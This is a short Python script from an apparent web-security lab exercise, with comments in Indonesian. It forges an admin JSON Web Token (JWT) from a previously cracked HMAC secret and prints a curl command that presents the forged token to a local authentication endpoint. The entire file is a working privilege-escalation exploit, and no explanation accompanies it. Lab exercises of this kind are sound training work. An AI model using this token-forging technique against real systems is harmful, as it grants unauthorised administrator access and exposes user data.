#!/usr/bin/env python3
# ============================================================
# LAB BAC #3 - T1 (variant): forge JWT dengan secret yang bocor
# (setelah crack_secret.py menemukannya). — kikikokok
# ============================================================
import base64
import hashlib
import hmac
import json

SECRET = "KIKI_TOKEN_2026"  # hasil crack

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def jwt(payload: dict) -> str:
    h = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    seg = f"{h}.{p}"
    s = b64url(hmac.new(SECRET.encode(), seg.encode(), hashlib.sha256).digest())
    return f"{seg}.{s}"

if __name__ == "__main__":
    token = jwt({"uid": 1, "username": "admin", "role": "admin",
                 "cabang_id": 1, "exp": 2_000_000_000})
    print(token)
    print(f'\ncurl -s http://127.0.0.1:8094/api/auth/me.php -H "Authorization: Bearer {token}"')